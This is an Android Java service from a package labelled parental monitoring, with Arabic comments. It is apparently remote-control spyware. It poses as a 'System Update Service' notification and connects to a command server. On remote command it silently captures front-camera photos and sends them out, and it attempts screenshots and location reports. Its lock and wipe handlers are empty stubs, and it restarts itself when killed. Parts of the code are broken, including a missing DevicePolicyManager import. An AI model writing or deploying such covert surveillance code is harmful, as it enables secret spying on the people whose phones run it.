package com.parental.monitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.URI;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class BackgroundService extends Service {
    private static final String TAG = "MonitorService";
    private static final String CHANNEL_ID = "MonitorChannel";
    private static final int NOTIFICATION_ID = 1;
    
    private Socket socket;
    private Camera camera;
    private String deviceId;
    private Handler handler;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        
        // إظهار إشعار دائم (ضروري لخدمات Android 8+)
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // إنشاء معرف فريد للجهاز
        deviceId = Build.MODEL + "-" + System.currentTimeMillis();
        
        // الاتصال بالسيرفر
        connectToServer();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Notification.Builder builder = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update Service")
            .setContentText("قيد التشغيل...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setNotificationSilent();
        }

        return builder.build();
    }

    private void connectToServer() {
        try {
            SharedPreferences prefs = getSharedPreferences("config", MODE_PRIVATE);
            String serverUrl = prefs.getString("server_url", "http://192.168.1.100:3000");
            
            IO.Options options = new IO.Options();
            options.forceNew = true;
            options.reconnection = true;
            options.reconnectionAttempts = Integer.MAX_VALUE;
            options.reconnectionDelay = 3000;
            options.timeout = 10000;

            socket = IO.socket(URI.create(serverUrl), options);

            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(TAG, "✅ متصل بالسيرفر");
                    
                    // تسجيل الجهاز
                    JSONObject deviceInfo = new JSONObject();
                    try {
                        deviceInfo.put("deviceId", deviceId);
                        deviceInfo.put("name", Build.MODEL);
                        deviceInfo.put("phoneModel", Build.MANUFACTURER + " " + Build.MODEL);
                        deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
                    } catch (Exception e) {}
                    
                    socket.emit("register_device", deviceInfo);
                }
            });

            // استقبال أمر التقاط صورة
            socket.on("capture_photo", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    capturePhoto();
                }
            });

            // استقبال أمر لقطة شاشة
            socket.on("capture_screenshot", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    captureScreenshot();
                }
            });

            // استقبال أوامر التحكم
            socket.on("execute_command", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if (args.length > 0) {
                        String command = args[0].toString();
                        executeCommand(command);
                    }
                }
            });

            socket.connect();

        } catch (Exception e) {
            Log.e(TAG, "خطأ في الاتصال: " + e.getMessage());
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    connectToServer(); // إعادة المحاولة
                }
            }, 10000);
        }
    }

    private void capturePhoto() {
        try {
            if (camera != null) {
                camera.release();
            }
            
            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            Camera.Parameters params = camera.getParameters();
            params.setRotation(90);
            camera.setParameters(params);
            
            camera.setPreviewCallback(new Camera.PreviewCallback() {
                @Override
                public void onPreviewFrame(byte[] data, Camera camera) {
                    // تحويل البيانات إلى Base64 وإرسالها
                    String imageBase64 = Base64.encodeToString(data, Base64.DEFAULT);
                    
                    JSONObject photoData = new JSONObject();
                    try {
                        photoData.put("image", imageBase64);
                        photoData.put("timestamp", System.currentTimeMillis());
                    } catch (Exception e) {}
                    
                    socket.emit("photo_captured", photoData);
                    camera.release();
                    
                    // تسجيل النشاط
                    JSONObject logData = new JSONObject();
                    try {
                        logData.put("action", "photo_captured");
                        logData.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));
                    } catch (Exception e) {}
                    socket.emit("log", new JSONObject(){{put("type","الكاميرا");put("content",logData);}});
                }
            });
            
            camera.startPreview();
            
        } catch (Exception e) {
            Log.e(TAG, "خطأ في تصوير الكاميرا: " + e.getMessage());
        }
    }

    private void captureScreenshot() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                MediaProjectionManager projectionManager = 
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                
                // سيتم إرسال الرد بأنه لا يمكن التقاط شاشة بدون واجهة
                JSONObject response = new JSONObject();
                try {
                    response.put("status", "requires_activity");
                    response.put("message", "لم يتم التقاط الشاشة بسبب قيود Android");
                } catch (Exception e) {}
                
                socket.emit("screenshot_taken", response);
                
                // تسجيل النشاط
                JSONObject logData = new JSONObject();
                try {
                    logData.put("action", "screenshot_attempted");
                    logData.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));
                } catch (Exception e) {}
                socket.emit("log", new JSONObject(){{put("type","الشاشة");put("content",logData);}});
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ: " + e.getMessage());
        }
    }

    private void executeCommand(String command) {
        switch (command) {
            case "lock":
                try {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                } catch (Exception e) {}
                break;
                
            case "location":
                sendLocation();
                break;
                
            case "wipe":
                try {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                } catch (Exception e) {}
                break;
        }
    }

    private void sendLocation() {
        try {
            // سيتم إرسال الموقع في الإصدار الكامل مع Google Play Services
            JSONObject locationData = new JSONObject();
            try {
                locationData.put("latitude", "غير متاح");
                locationData.put("longitude", "غير متاح");
                locationData.put("message", "يتطلب Google Play Services للموقع الدقيق");
            } catch (Exception e) {}
            
            socket.emit("log", new JSONObject(){{put("type","الموقع");put("content",locationData);}});
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // يعاد تشغيل الخدمة تلقائياً
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) {
            socket.disconnect();
        }
        if (camera != null) {
            camera.release();
        }
        
        // إعادة تشغيل الخدمة
        Intent restartIntent = new Intent(this, BackgroundService.class);
        startService(restartIntent);
    }
}
